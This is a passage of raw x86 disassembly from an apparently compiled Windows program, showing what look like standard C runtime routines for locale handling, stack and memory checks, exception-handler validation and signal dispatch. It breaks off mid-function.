  435c21:	mov    edi,DWORD PTR [esi+eax*1]
  435c24:	mov    DWORD PTR [ebp-0x1c],edi
  435c27:	cmp    edi,ebx
  435c29:	je     0x435c3d
  435c2b:	mov    DWORD PTR [edi+0x4],ebx
  435c2e:	mov    DWORD PTR [edi+0xc],ebx
  435c31:	mov    DWORD PTR [edi+0x8],ebx
  435c34:	mov    DWORD PTR [edi],ebx
  435c36:	mov    DWORD PTR [edi+0x1c],ebx
  435c39:	or     DWORD PTR [edi+0x10],0xffffffff
  435c3d:	or     DWORD PTR [ebp-0x4],0xffffffff
  435c41:	call   0x435c51
  435c46:	mov    eax,edi
  435c48:	call   0x43124b
  435c4d:	ret    
  435c4e:	mov    edi,DWORD PTR [ebp-0x1c]
  435c51:	push   0x1
  435c53:	call   0x431071
  435c58:	pop    ecx
  435c59:	ret    
  435c5a:	push   ebp
  435c5b:	mov    ebp,esp
  435c5d:	sub    esp,0xc
  435c60:	mov    eax,ds:0x43d404
  435c65:	push   0x6
  435c67:	mov    DWORD PTR [ebp-0x4],eax
  435c6a:	lea    eax,[ebp-0xc]
  435c6d:	push   eax
  435c6e:	push   0x1004
  435c73:	push   DWORD PTR [ebp+0x8]
  435c76:	mov    BYTE PTR [ebp-0x6],0x0
  435c7a:	call   DWORD PTR ds:0x439124
  435c80:	test   eax,eax
  435c82:	jne    0x435c89
  435c84:	or     eax,0xffffffff
  435c87:	jmp    0x435c93
  435c89:	lea    eax,[ebp-0xc]
  435c8c:	push   eax
  435c8d:	call   0x437397
  435c92:	pop    ecx
  435c93:	mov    ecx,DWORD PTR [ebp-0x4]
  435c96:	call   0x42f1f2
  435c9b:	leave  
  435c9c:	ret    
  435c9d:	push   0x38
  435c9f:	push   0x43b330
  435ca4:	call   0x431210
  435ca9:	mov    eax,ds:0x43d404
  435cae:	mov    DWORD PTR [ebp-0x1c],eax
  435cb1:	xor    edi,edi
  435cb3:	mov    DWORD PTR [ebp-0x34],edi
  435cb6:	mov    DWORD PTR [ebp-0x44],edi
  435cb9:	mov    eax,DWORD PTR [ebp+0x14]
  435cbc:	mov    ebx,DWORD PTR [eax]
  435cbe:	mov    DWORD PTR [ebp-0x40],ebx
  435cc1:	mov    DWORD PTR [ebp-0x3c],edi
  435cc4:	mov    eax,DWORD PTR [ebp+0x8]
  435cc7:	cmp    eax,DWORD PTR [ebp+0xc]
  435cca:	je     0x435e43
  435cd0:	lea    ecx,[ebp-0x30]
  435cd3:	push   ecx
  435cd4:	push   eax
  435cd5:	mov    esi,DWORD PTR ds:0x4390b4
  435cdb:	call   esi
  435cdd:	test   eax,eax
  435cdf:	je     0x435d01
  435ce1:	cmp    DWORD PTR [ebp-0x30],0x1
  435ce5:	jne    0x435d01
  435ce7:	lea    eax,[ebp-0x30]
  435cea:	push   eax
  435ceb:	push   DWORD PTR [ebp+0xc]
  435cee:	call   esi
  435cf0:	test   eax,eax
  435cf2:	je     0x435d01
  435cf4:	cmp    DWORD PTR [ebp-0x30],0x1
  435cf8:	jne    0x435d01
  435cfa:	mov    DWORD PTR [ebp-0x3c],0x1
  435d01:	cmp    DWORD PTR [ebp-0x3c],edi
  435d04:	je     0x435d20
  435d06:	cmp    ebx,0xffffffff
  435d09:	je     0x435d0f
  435d0b:	mov    esi,ebx
  435d0d:	jmp    0x435d1b
  435d0f:	push   DWORD PTR [ebp+0x10]
  435d12:	call   0x42e160
  435d17:	pop    ecx
  435d18:	mov    esi,eax
  435d1a:	inc    esi
  435d1b:	mov    DWORD PTR [ebp-0x38],esi
  435d1e:	jmp    0x435d23
  435d20:	mov    esi,DWORD PTR [ebp-0x38]
  435d23:	cmp    DWORD PTR [ebp-0x3c],edi
  435d26:	jne    0x435d42
  435d28:	push   edi
  435d29:	push   edi
  435d2a:	push   ebx
  435d2b:	push   DWORD PTR [ebp+0x10]
  435d2e:	push   0x1
  435d30:	push   DWORD PTR [ebp+0x8]
  435d33:	call   DWORD PTR ds:0x4390a8
  435d39:	mov    esi,eax
  435d3b:	mov    DWORD PTR [ebp-0x38],esi
  435d3e:	cmp    esi,edi
  435d40:	je     0x435d9a
  435d42:	mov    DWORD PTR [ebp-0x4],edi
  435d45:	lea    eax,[esi+esi*1]
  435d48:	add    eax,0x3
  435d4b:	and    eax,0xfffffffc
  435d4e:	call   0x433bb0
  435d53:	mov    DWORD PTR [ebp-0x18],esp
  435d56:	mov    ebx,esp
  435d58:	mov    DWORD PTR [ebp-0x48],ebx
  435d5b:	lea    eax,[esi+esi*1]
  435d5e:	push   eax
  435d5f:	push   edi
  435d60:	push   ebx
  435d61:	call   0x42e4e0
  435d66:	add    esp,0xc
  435d69:	or     DWORD PTR [ebp-0x4],0xffffffff
  435d6d:	jmp    0x435d86
  435d6f:	xor    eax,eax
  435d71:	inc    eax
  435d72:	ret    
  435d73:	mov    esp,DWORD PTR [ebp-0x18]
  435d76:	call   0x435e66
  435d7b:	xor    edi,edi
  435d7d:	xor    ebx,ebx
  435d7f:	or     DWORD PTR [ebp-0x4],0xffffffff
  435d83:	mov    esi,DWORD PTR [ebp-0x38]
  435d86:	cmp    ebx,edi
  435d88:	jne    0x435da8
  435d8a:	push   esi
  435d8b:	push   0x2
  435d8d:	call   0x4340db
  435d92:	pop    ecx
  435d93:	pop    ecx
  435d94:	mov    ebx,eax
  435d96:	cmp    ebx,edi
  435d98:	jne    0x435da1
  435d9a:	xor    eax,eax
  435d9c:	jmp    0x435e55
  435da1:	mov    DWORD PTR [ebp-0x44],0x1
  435da8:	push   esi
  435da9:	push   ebx
  435daa:	push   DWORD PTR [ebp-0x40]
  435dad:	push   DWORD PTR [ebp+0x10]
  435db0:	push   0x1
  435db2:	push   DWORD PTR [ebp+0x8]
  435db5:	call   DWORD PTR ds:0x4390a8
  435dbb:	test   eax,eax
  435dbd:	je     0x435e46
  435dc3:	cmp    DWORD PTR [ebp+0x18],edi
  435dc6:	je     0x435de8
  435dc8:	push   edi
  435dc9:	push   edi
  435dca:	push   DWORD PTR [ebp+0x1c]
  435dcd:	push   DWORD PTR [ebp+0x18]
  435dd0:	push   esi
  435dd1:	push   ebx
  435dd2:	push   edi
  435dd3:	push   DWORD PTR [ebp+0xc]
  435dd6:	call   DWORD PTR ds:0x4390a4
  435ddc:	test   eax,eax
  435dde:	je     0x435e46
  435de0:	mov    eax,DWORD PTR [ebp+0x18]
  435de3:	mov    DWORD PTR [ebp-0x34],eax
  435de6:	jmp    0x435e46
  435de8:	cmp    DWORD PTR [ebp-0x3c],edi
  435deb:	jne    0x435e03
  435ded:	push   edi
  435dee:	push   edi
  435def:	push   edi
  435df0:	push   edi
  435df1:	push   esi
  435df2:	push   ebx
  435df3:	push   edi
  435df4:	push   DWORD PTR [ebp+0xc]
  435df7:	call   DWORD PTR ds:0x4390a4
  435dfd:	mov    esi,eax
  435dff:	cmp    esi,edi
  435e01:	je     0x435e46
  435e03:	push   esi
  435e04:	push   0x1
  435e06:	call   0x4340db
  435e0b:	pop    ecx
  435e0c:	pop    ecx
  435e0d:	mov    DWORD PTR [ebp-0x34],eax
  435e10:	cmp    eax,edi
  435e12:	je     0x435e46
  435e14:	push   edi
  435e15:	push   edi
  435e16:	push   esi
  435e17:	push   eax
  435e18:	push   esi
  435e19:	push   ebx
  435e1a:	push   edi
  435e1b:	push   DWORD PTR [ebp+0xc]
  435e1e:	call   DWORD PTR ds:0x4390a4
  435e24:	cmp    eax,edi
  435e26:	jne    0x435e36
  435e28:	push   DWORD PTR [ebp-0x34]
  435e2b:	call   0x42e0ed
  435e30:	pop    ecx
  435e31:	mov    DWORD PTR [ebp-0x34],edi
  435e34:	jmp    0x435e46
  435e36:	cmp    DWORD PTR [ebp-0x40],0xffffffff
  435e3a:	je     0x435e46
  435e3c:	mov    ecx,DWORD PTR [ebp+0x14]
  435e3f:	mov    DWORD PTR [ecx],eax
  435e41:	jmp    0x435e46
  435e43:	mov    ebx,DWORD PTR [ebp-0x48]
  435e46:	cmp    DWORD PTR [ebp-0x44],edi
  435e49:	je     0x435e52
  435e4b:	push   ebx
  435e4c:	call   0x42e0ed
  435e51:	pop    ecx
  435e52:	mov    eax,DWORD PTR [ebp-0x34]
  435e55:	lea    esp,[ebp-0x54]
  435e58:	mov    ecx,DWORD PTR [ebp-0x1c]
  435e5b:	call   0x42f1f2
  435e60:	call   0x43124b
  435e65:	ret    
  435e66:	push   ebp
  435e67:	mov    ebp,esp
  435e69:	sub    esp,0x4c
  435e6c:	push   ebx
  435e6d:	push   esi
  435e6e:	push   edi
  435e6f:	push   0x4
  435e71:	pop    eax
  435e72:	call   0x433bb0
  435e77:	mov    esi,esp
  435e79:	push   0x1c
  435e7b:	lea    eax,[ebp-0x28]
  435e7e:	push   eax
  435e7f:	push   esi
  435e80:	call   DWORD PTR ds:0x439144
  435e86:	test   eax,eax
  435e88:	je     0x435f01
  435e8a:	mov    ebx,DWORD PTR [ebp-0x24]
  435e8d:	lea    eax,[ebp-0x4c]
  435e90:	push   eax
  435e91:	call   DWORD PTR ds:0x439058
  435e97:	mov    ecx,DWORD PTR [ebp-0x48]
  435e9a:	mov    eax,ds:0x43fcb0
  435e9f:	lea    edi,[ecx-0x1]
  435ea2:	not    edi
  435ea4:	and    edi,esi
  435ea6:	sub    edi,ecx
  435ea8:	mov    esi,eax
  435eaa:	dec    esi
  435eab:	neg    esi
  435ead:	sbb    esi,esi
  435eaf:	and    esi,0xfffffff1
  435eb2:	add    esi,0x11
  435eb5:	imul   esi,ecx
  435eb8:	add    esi,ebx
  435eba:	cmp    edi,esi
  435ebc:	mov    DWORD PTR [ebp-0x8],ecx
  435ebf:	jb     0x435f01
  435ec1:	cmp    eax,0x1
  435ec4:	je     0x435f22
  435ec6:	mov    DWORD PTR [ebp-0x4],ebx
  435ec9:	mov    ebx,0x1000
  435ece:	push   0x1c
  435ed0:	lea    eax,[ebp-0x28]
  435ed3:	push   eax
  435ed4:	push   DWORD PTR [ebp-0x4]
  435ed7:	call   DWORD PTR ds:0x439144
  435edd:	test   eax,eax
  435edf:	je     0x435f01
  435ee1:	mov    eax,DWORD PTR [ebp-0x1c]
  435ee4:	add    DWORD PTR [ebp-0x4],eax
  435ee7:	test   DWORD PTR [ebp-0x18],ebx
  435eea:	je     0x435ece
  435eec:	test   BYTE PTR [ebp-0x13],0x1
  435ef0:	mov    eax,DWORD PTR [ebp-0x28]
  435ef3:	mov    DWORD PTR [ebp-0x4],eax
  435ef6:	je     0x435efd
  435ef8:	xor    eax,eax
  435efa:	inc    eax
  435efb:	jmp    0x435f41
  435efd:	cmp    edi,eax
  435eff:	jae    0x435f05
  435f01:	xor    eax,eax
  435f03:	jmp    0x435f41
  435f05:	cmp    eax,esi
  435f07:	jae    0x435f0c
  435f09:	mov    DWORD PTR [ebp-0x4],esi
  435f0c:	push   0x4
  435f0e:	push   ebx
  435f0f:	push   DWORD PTR [ebp-0x8]
  435f12:	push   DWORD PTR [ebp-0x4]
  435f15:	call   DWORD PTR ds:0x439044
  435f1b:	mov    eax,ds:0x43fcb0
  435f20:	jmp    0x435f25
  435f22:	mov    DWORD PTR [ebp-0x4],edi
  435f25:	dec    eax
  435f26:	neg    eax
  435f28:	sbb    eax,eax
  435f2a:	and    eax,0x103
  435f2f:	lea    ecx,[ebp-0xc]
  435f32:	push   ecx
  435f33:	inc    eax
  435f34:	push   eax
  435f35:	push   DWORD PTR [ebp-0x8]
  435f38:	push   DWORD PTR [ebp-0x4]
  435f3b:	call   DWORD PTR ds:0x439060
  435f41:	lea    esp,[ebp-0x58]
  435f44:	pop    edi
  435f45:	pop    esi
  435f46:	pop    ebx
  435f47:	leave  
  435f48:	ret    
  435f49:	push   ebp
  435f4a:	mov    ebp,esp
  435f4c:	push   ecx
  435f4d:	mov    eax,DWORD PTR [ebp+0xc]
  435f50:	lea    ecx,[eax+0x1]
  435f53:	cmp    ecx,0x100
  435f59:	mov    ecx,DWORD PTR [ebp+0x8]
  435f5c:	ja     0x435f67
  435f5e:	mov    ecx,DWORD PTR [ecx+0x48]
  435f61:	movzx  eax,WORD PTR [ecx+eax*2]
  435f65:	jmp    0x435fbb
  435f67:	push   esi
  435f68:	mov    edx,eax
  435f6a:	sar    edx,0x8
  435f6d:	push   edi
  435f6e:	mov    edi,DWORD PTR [ecx+0x48]
  435f71:	movzx  esi,dl
  435f74:	test   BYTE PTR [edi+esi*2+0x1],0x80
  435f79:	pop    edi
  435f7a:	pop    esi
  435f7b:	je     0x435f8c
  435f7d:	push   0x2
  435f7f:	mov    BYTE PTR [ebp-0x3],al
  435f82:	mov    BYTE PTR [ebp-0x4],dl
  435f85:	mov    BYTE PTR [ebp-0x2],0x0
  435f89:	pop    eax
  435f8a:	jmp    0x435f96
  435f8c:	mov    BYTE PTR [ebp-0x4],al
  435f8f:	xor    eax,eax
  435f91:	mov    BYTE PTR [ebp-0x3],0x0
  435f95:	inc    eax
  435f96:	push   0x1
  435f98:	push   DWORD PTR [ecx+0x14]
  435f9b:	push   DWORD PTR [ecx+0x4]
  435f9e:	lea    ecx,[ebp+0xe]
  435fa1:	push   ecx
  435fa2:	push   eax
  435fa3:	lea    eax,[ebp-0x4]
  435fa6:	push   eax
  435fa7:	push   0x1
  435fa9:	call   0x435738
  435fae:	add    esp,0x1c
  435fb1:	test   eax,eax
  435fb3:	jne    0x435fb7
  435fb5:	leave  
  435fb6:	ret    
  435fb7:	movzx  eax,WORD PTR [ebp+0xe]
  435fbb:	and    eax,DWORD PTR [ebp+0x10]
  435fbe:	leave  
  435fbf:	ret    
  435fc0:	push   ebp
  435fc1:	mov    ebp,esp
  435fc3:	sub    esp,0x84
  435fc9:	mov    eax,ds:0x43d404
  435fce:	push   ebx
  435fcf:	push   esi
  435fd0:	xor    ebx,ebx
  435fd2:	cmp    DWORD PTR [ebp+0x8],0x1
  435fd6:	mov    DWORD PTR [ebp-0x4],eax
  435fd9:	push   edi
  435fda:	jne    0x436098
  435fe0:	push   ebx
  435fe1:	lea    edi,[ebp-0x84]
  435fe7:	push   0x80
  435fec:	mov    eax,edi
  435fee:	push   eax
  435fef:	push   DWORD PTR [ebp+0x10]
  435ff2:	mov    DWORD PTR [ebp+0x8],ebx
  435ff5:	push   DWORD PTR [ebp+0xc]
  435ff8:	call   0x437972
  435ffd:	mov    esi,eax
  435fff:	add    esp,0x14
  436002:	cmp    esi,ebx
  436004:	jne    0x436053
  436006:	call   DWORD PTR ds:0x4390ac
  43600c:	cmp    eax,0x7a
  43600f:	jne    0x43606f
  436011:	push   ebx
  436012:	push   ebx
  436013:	push   ebx
  436014:	push   DWORD PTR [ebp+0x10]
  436017:	push   DWORD PTR [ebp+0xc]
  43601a:	call   0x437972
  43601f:	mov    esi,eax
  436021:	add    esp,0x14
  436024:	cmp    esi,ebx
  436026:	je     0x43606f
  436028:	push   esi
  436029:	call   0x4311fe
  43602e:	mov    edi,eax
  436030:	cmp    edi,ebx
  436032:	pop    ecx
  436033:	je     0x43606f
  436035:	push   ebx
  436036:	push   esi
  436037:	push   edi
  436038:	push   DWORD PTR [ebp+0x10]
  43603b:	mov    DWORD PTR [ebp+0x8],0x1
  436042:	push   DWORD PTR [ebp+0xc]
  436045:	call   0x437972
  43604a:	mov    esi,eax
  43604c:	add    esp,0x14
  43604f:	cmp    esi,ebx
  436051:	je     0x436068
  436053:	push   esi
  436054:	call   0x4311fe
  436059:	cmp    eax,ebx
  43605b:	pop    ecx
  43605c:	mov    ecx,DWORD PTR [ebp+0x14]
  43605f:	mov    DWORD PTR [ecx],eax
  436061:	jne    0x43607f
  436063:	cmp    DWORD PTR [ebp+0x8],ebx
  436066:	je     0x43606f
  436068:	push   edi
  436069:	call   0x42e0ed
  43606e:	pop    ecx
  43606f:	or     eax,0xffffffff
  436072:	mov    ecx,DWORD PTR [ebp-0x4]
  436075:	pop    edi
  436076:	pop    esi
  436077:	pop    ebx
  436078:	call   0x42f1f2
  43607d:	leave  
  43607e:	ret    
  43607f:	push   esi
  436080:	push   edi
  436081:	push   eax
  436082:	call   0x434d20
  436087:	add    esp,0xc
  43608a:	cmp    DWORD PTR [ebp+0x8],ebx
  43608d:	je     0x4360e3
  43608f:	push   edi
  436090:	call   0x42e0ed
  436095:	pop    ecx
  436096:	jmp    0x4360e3
  436098:	cmp    DWORD PTR [ebp+0x8],ebx
  43609b:	jne    0x43606f
  43609d:	push   ebx
  43609e:	push   0x4
  4360a0:	mov    edi,0x43fe94
  4360a5:	push   edi
  4360a6:	push   DWORD PTR [ebp+0x10]
  4360a9:	push   DWORD PTR [ebp+0xc]
  4360ac:	call   0x437842
  4360b1:	add    esp,0x14
  4360b4:	test   eax,eax
  4360b6:	je     0x43606f
  4360b8:	mov    esi,DWORD PTR [ebp+0x14]
  4360bb:	mov    BYTE PTR [esi],bl
  4360bd:	mov    bl,BYTE PTR [edi]
  4360bf:	movzx  eax,bl
  4360c2:	push   eax
  4360c3:	call   0x430d7d
  4360c8:	test   eax,eax
  4360ca:	pop    ecx
  4360cb:	je     0x4360e3
  4360cd:	mov    al,BYTE PTR [esi]
  4360cf:	mov    cl,0xa
  4360d1:	imul   cl
  4360d3:	add    al,bl
  4360d5:	sub    al,0x30
  4360d7:	inc    edi
  4360d8:	inc    edi
  4360d9:	cmp    edi,0x43fe9c
  4360df:	mov    BYTE PTR [esi],al
  4360e1:	jl     0x4360bd
  4360e3:	xor    eax,eax
  4360e5:	jmp    0x436072
  4360e7:	push   DWORD PTR [esp+0x4]
  4360eb:	call   DWORD PTR ds:0x439080
  4360f1:	xor    eax,eax
  4360f3:	inc    eax
  4360f4:	ret    0x8
  4360f7:	push   0x10
  4360f9:	push   0x43b368
  4360fe:	call   0x431210
  436103:	mov    eax,ds:0x43fe9c
  436108:	test   eax,eax
  43610a:	jne    0x436143
  43610c:	cmp    DWORD PTR ds:0x43fcb0,0x1
  436113:	je     0x436139
  436115:	push   0x43a1ac
  43611a:	call   DWORD PTR ds:0x43905c
  436120:	test   eax,eax
  436122:	je     0x436139
  436124:	push   0x43b33c
  436129:	push   eax
  43612a:	call   DWORD PTR ds:0x4390c8
  436130:	mov    ds:0x43fe9c,eax
  436135:	test   eax,eax
  436137:	jne    0x436143
  436139:	mov    eax,0x4360e7
  43613e:	mov    ds:0x43fe9c,eax
  436143:	and    DWORD PTR [ebp-0x4],0x0
  436147:	push   DWORD PTR [ebp+0xc]
  43614a:	push   DWORD PTR [ebp+0x8]
  43614d:	call   eax
  43614f:	mov    DWORD PTR [ebp-0x20],eax
  436152:	jmp    0x436178
  436154:	mov    eax,DWORD PTR [ebp-0x14]
  436157:	mov    eax,DWORD PTR [eax]
  436159:	mov    eax,DWORD PTR [eax]
  43615b:	mov    DWORD PTR [ebp-0x1c],eax
  43615e:	xor    eax,eax
  436160:	inc    eax
  436161:	ret    
  436162:	mov    esp,DWORD PTR [ebp-0x18]
  436165:	cmp    DWORD PTR [ebp-0x1c],0xc0000017
  43616c:	jne    0x436176
  43616e:	push   0x8
  436170:	call   DWORD PTR ds:0x4390fc
  436176:	xor    eax,eax
  436178:	or     DWORD PTR [ebp-0x4],0xffffffff
  43617c:	call   0x43124b
  436181:	ret    
  436182:	push   ebp
  436183:	mov    ebp,esp
  436185:	sub    esp,0x20
  436188:	push   ebx
  436189:	push   esi
  43618a:	mov    esi,DWORD PTR [ebp+0x8]
  43618d:	mov    ebx,DWORD PTR [esi+0x8]
  436190:	test   bl,0x3
  436193:	jne    0x4361b0
  436195:	mov    eax,fs:0x18
  43619b:	mov    DWORD PTR [ebp+0x8],eax
  43619e:	mov    eax,DWORD PTR [ebp+0x8]
  4361a1:	mov    ecx,DWORD PTR [eax+0x8]
  4361a4:	cmp    ebx,ecx
  4361a6:	mov    DWORD PTR [ebp-0x4],ecx
  4361a9:	jb     0x4361b7
  4361ab:	cmp    ebx,DWORD PTR [eax+0x4]
  4361ae:	jae    0x4361b7
  4361b0:	xor    eax,eax
  4361b2:	jmp    0x4363a7
  4361b7:	push   edi
  4361b8:	mov    edi,DWORD PTR [esi+0xc]
  4361bb:	cmp    edi,0xffffffff
  4361be:	jne    0x4361c8
  4361c0:	xor    eax,eax
  4361c2:	inc    eax
  4361c3:	jmp    0x4363a6
  4361c8:	xor    edx,edx
  4361ca:	mov    DWORD PTR [ebp+0x8],edx
  4361cd:	mov    eax,ebx
  4361cf:	mov    ecx,DWORD PTR [eax]
  4361d1:	cmp    ecx,0xffffffff
  4361d4:	je     0x4361de
  4361d6:	cmp    ecx,edx
  4361d8:	jae    0x436323
  4361de:	cmp    DWORD PTR [eax+0x4],0x0
  4361e2:	je     0x4361e7
  4361e4:	inc    DWORD PTR [ebp+0x8]
  4361e7:	inc    edx
  4361e8:	add    eax,0xc
  4361eb:	cmp    edx,edi
  4361ed:	jbe    0x4361cf
  4361ef:	cmp    DWORD PTR [ebp+0x8],0x0
  4361f3:	je     0x436209
  4361f5:	mov    eax,DWORD PTR [esi-0x8]
  4361f8:	cmp    eax,DWORD PTR [ebp-0x4]
  4361fb:	jb     0x436323
  436201:	cmp    eax,esi
  436203:	jae    0x436323
  436209:	mov    eax,ds:0x43fea8
  43620e:	mov    edi,ebx
  436210:	and    edi,0xfffff000
  436216:	xor    esi,esi
  436218:	test   eax,eax
  43621a:	jle    0x43622e
  43621c:	cmp    DWORD PTR [esi*4+0x43feb0],edi
  436223:	je     0x436327
  436229:	inc    esi
  43622a:	cmp    esi,eax
  43622c:	jl     0x43621c
  43622e:	push   0x1c
  436230:	lea    eax,[ebp-0x20]
  436233:	push   eax
  436234:	push   ebx
  436235:	call   DWORD PTR ds:0x439144
  43623b:	test   eax,eax
  43623d:	je     0x4363a3
  436243:	cmp    DWORD PTR [ebp-0x8],0x1000000
  43624a:	jne    0x4363a3
  436250:	test   BYTE PTR [ebp-0xc],0xcc
  436254:	je     0x4362ac
  436256:	mov    ecx,DWORD PTR [ebp-0x1c]
  436259:	cmp    WORD PTR [ecx],0x5a4d
  43625e:	jne    0x4363a3
  436264:	mov    eax,DWORD PTR [ecx+0x3c]
  436267:	add    eax,ecx
  436269:	cmp    DWORD PTR [eax],0x4550
  43626f:	jne    0x4363a3
  436275:	cmp    WORD PTR [eax+0x18],0x10b
  43627b:	jne    0x4363a3
  436281:	sub    ebx,ecx
  436283:	cmp    WORD PTR [eax+0x6],0x0
  436288:	movzx  ecx,WORD PTR [eax+0x14]
  43628c:	lea    ecx,[ecx+eax*1+0x18]
  436290:	jbe    0x4363a3
  436296:	mov    eax,DWORD PTR [ecx+0xc]
  436299:	cmp    ebx,eax
  43629b:	jb     0x4362ac
  43629d:	mov    edx,DWORD PTR [ecx+0x8]
  4362a0:	add    edx,eax
  4362a2:	cmp    ebx,edx
  4362a4:	jae    0x4362ac
  4362a6:	test   BYTE PTR [ecx+0x27],0x80
  4362aa:	jne    0x436323
  4362ac:	push   0x1
  4362ae:	push   0x43fef0
  4362b3:	call   DWORD PTR ds:0x43907c
  4362b9:	test   eax,eax
  4362bb:	jne    0x4361c0
  4362c1:	mov    ecx,DWORD PTR ds:0x43fea8
  4362c7:	test   ecx,ecx
  4362c9:	mov    edx,ecx
  4362cb:	jle    0x4362e0
  4362cd:	lea    eax,[ecx*4+0x43feac]
  4362d4:	cmp    DWORD PTR [eax],edi
  4362d6:	je     0x4362e0
  4362d8:	dec    edx
  4362d9:	sub    eax,0x4
  4362dc:	test   edx,edx
  4362de:	jg     0x4362d4
  4362e0:	test   edx,edx
  4362e2:	jne    0x436311
  4362e4:	push   0xf
  4362e6:	pop    ebx
  4362e7:	cmp    ecx,ebx
  4362e9:	jg     0x4362ed
  4362eb:	mov    ebx,ecx
  4362ed:	xor    edx,edx
  4362ef:	test   ebx,ebx
  4362f1:	jl     0x436305
  4362f3:	lea    eax,[edx*4+0x43feb0]
  4362fa:	mov    esi,DWORD PTR [eax]
  4362fc:	inc    edx
  4362fd:	cmp    edx,ebx
  4362ff:	mov    DWORD PTR [eax],edi
  436301:	mov    edi,esi
  436303:	jle    0x4362f3
  436305:	cmp    ecx,0x10
  436308:	jge    0x436311
  43630a:	inc    ecx
  43630b:	mov    DWORD PTR ds:0x43fea8,ecx
  436311:	push   0x0
  436313:	push   0x43fef0
  436318:	call   DWORD PTR ds:0x43907c
  43631e:	jmp    0x4361c0
  436323:	xor    eax,eax
  436325:	jmp    0x4363a6
  436327:	test   esi,esi
  436329:	jle    0x4361c0
  43632f:	mov    ebx,DWORD PTR ds:0x43907c
  436335:	push   0x1
  436337:	push   0x43fef0
  43633c:	call   ebx
  43633e:	test   eax,eax
  436340:	jne    0x4361c0
  436346:	cmp    DWORD PTR [esi*4+0x43feb0],edi
  43634d:	je     0x43637d
  43634f:	mov    eax,ds:0x43fea8
  436354:	lea    esi,[eax-0x1]
  436357:	test   esi,esi
  436359:	jl     0x43636b
  43635b:	cmp    DWORD PTR [esi*4+0x43feb0],edi
  436362:	je     0x436367
  436364:	dec    esi
  436365:	jns    0x43635b
  436367:	test   esi,esi
  436369:	jge    0x43637b
  43636b:	cmp    eax,0x10
  43636e:	jge    0x436376
  436370:	inc    eax
  436371:	mov    ds:0x43fea8,eax
  436376:	lea    esi,[eax-0x1]
  436379:	jmp    0x43637d
  43637b:	je     0x436395
  43637d:	xor    ecx,ecx
  43637f:	test   esi,esi
  436381:	jl     0x436395
  436383:	lea    eax,[ecx*4+0x43feb0]
  43638a:	mov    edx,DWORD PTR [eax]
  43638c:	inc    ecx
  43638d:	cmp    ecx,esi
  43638f:	mov    DWORD PTR [eax],edi
  436391:	mov    edi,edx
  436393:	jle    0x436383
  436395:	push   0x0
  436397:	push   0x43fef0
  43639c:	call   ebx
  43639e:	jmp    0x4361c0
  4363a3:	or     eax,0xffffffff
  4363a6:	pop    edi
  4363a7:	pop    esi
  4363a8:	pop    ebx
  4363a9:	leave  
  4363aa:	ret    
  4363ab:	mov    ecx,DWORD PTR ds:0x43dc3c
  4363b1:	mov    eax,edx
  4363b3:	push   edi
  4363b4:	cmp    DWORD PTR [eax+0x4],esi
  4363b7:	je     0x4363c6
  4363b9:	lea    edi,[ecx+ecx*2]
  4363bc:	add    eax,0xc
  4363bf:	lea    edi,[edx+edi*4]
  4363c2:	cmp    eax,edi
  4363c4:	jb     0x4363b4
  4363c6:	lea    ecx,[ecx+ecx*2]
  4363c9:	lea    ecx,[edx+ecx*4]
  4363cc:	cmp    eax,ecx
  4363ce:	pop    edi
  4363cf:	jae    0x4363d6
  4363d1:	cmp    DWORD PTR [eax+0x4],esi
  4363d4:	je     0x4363d8
  4363d6:	xor    eax,eax
  4363d8:	ret    
  4363d9:	push   0x20
  4363db:	push   0x43b378
  4363e0:	call   0x431210
  4363e5:	xor    ecx,ecx
  4363e7:	mov    DWORD PTR [ebp-0x1c],ecx
  4363ea:	mov    eax,DWORD PTR [ebp+0x8]
  4363ed:	dec    eax
  4363ee:	dec    eax
  4363ef:	je     0x43645b
  4363f1:	dec    eax
  4363f2:	dec    eax
  4363f3:	je     0x43643b
  4363f5:	sub    eax,0x4
  4363f8:	je     0x43643b
  4363fa:	sub    eax,0x3
  4363fd:	je     0x43643b
  4363ff:	sub    eax,0x4
  436402:	je     0x43642e
  436404:	sub    eax,0x6
  436407:	je     0x436421
  436409:	dec    eax
  43640a:	je     0x436414
  43640c:	or     eax,0xffffffff
  43640f:	jmp    0x43654c
  436414:	mov    esi,0x43fefc
  436419:	mov    edi,DWORD PTR ds:0x43fefc
  43641f:	jmp    0x436466
  436421:	mov    esi,0x43fef8
  436426:	mov    edi,DWORD PTR ds:0x43fef8
  43642c:	jmp    0x436466
  43642e:	mov    esi,0x43ff00
  436433:	mov    edi,DWORD PTR ds:0x43ff00
  436439:	jmp    0x436466
  43643b:	call   0x433901
  436440:	mov    ebx,eax
  436442:	mov    DWORD PTR [ebp-0x24],ebx
  436445:	mov    edx,DWORD PTR [ebx+0x54]
  436448:	mov    esi,DWORD PTR [ebp+0x8]
  43644b:	call   0x4363ab
  436450:	mov    esi,eax
  436452:	add    esi,0x8
  436455:	mov    edi,DWORD PTR [esi]
  436457:	xor    ecx,ecx
  436459:	jmp    0x436470
  43645b:	mov    esi,0x43fef4
  436460:	mov    edi,DWORD PTR ds:0x43fef4
  436466:	mov    DWORD PTR [ebp-0x1c],0x1
  43646d:	mov    ebx,DWORD PTR [ebp-0x24]
  436470:	mov    DWORD PTR [ebp-0x20],edi
  436473:	cmp    edi,0x1
  436476:	je     0x43654a
  43647c:	cmp    edi,ecx
  43647e:	jne    0x436487
  436480:	push   0x3
  436482:	call   0x432ebe
  436487:	cmp    DWORD PTR [ebp-0x1c],ecx
  43648a:	je     0x436495
  43648c:	push   ecx
  43648d:	call   0x431126
  436492:	pop    ecx
  436493:	xor    ecx,ecx
  436495:	mov    DWORD PTR [ebp-0x4],ecx
  436498:	mov    eax,DWORD PTR [ebp+0x8]
  43649b:	cmp    eax,0x8
  43649e:	je     0x4364aa
  4364a0:	cmp    eax,0xb
  4364a3:	je     0x4364aa
  4364a5:	cmp    eax,0x4
  4364a8:	jne    0x4364c5
  4364aa:	mov    edx,DWORD PTR [ebx+0x58]
  4364ad:	mov    DWORD PTR [ebp-0x2c],edx
  4364b0:	mov    DWORD PTR [ebx+0x58],ecx
  4364b3:	cmp    eax,0x8
  4364b6:	jne    0x4364f1
  4364b8:	mov    edx,DWORD PTR [ebx+0x5c]
  4364bb:	mov    DWORD PTR [ebp-0x30],edx
  4364be:	mov    DWORD PTR [ebx+0x5c],0x8c
  4364c5:	cmp    eax,0x8
  4364c8:	jne    0x4364f1
  4364ca:	mov    eax,ds:0x43dc30
  4364cf:	mov    DWORD PTR [ebp-0x28],eax
  4364d2:	mov    edx,DWORD PTR ds:0x43dc34
  4364d8:	mov    esi,DWORD PTR ds:0x43dc30
  4364de:	add    edx,esi
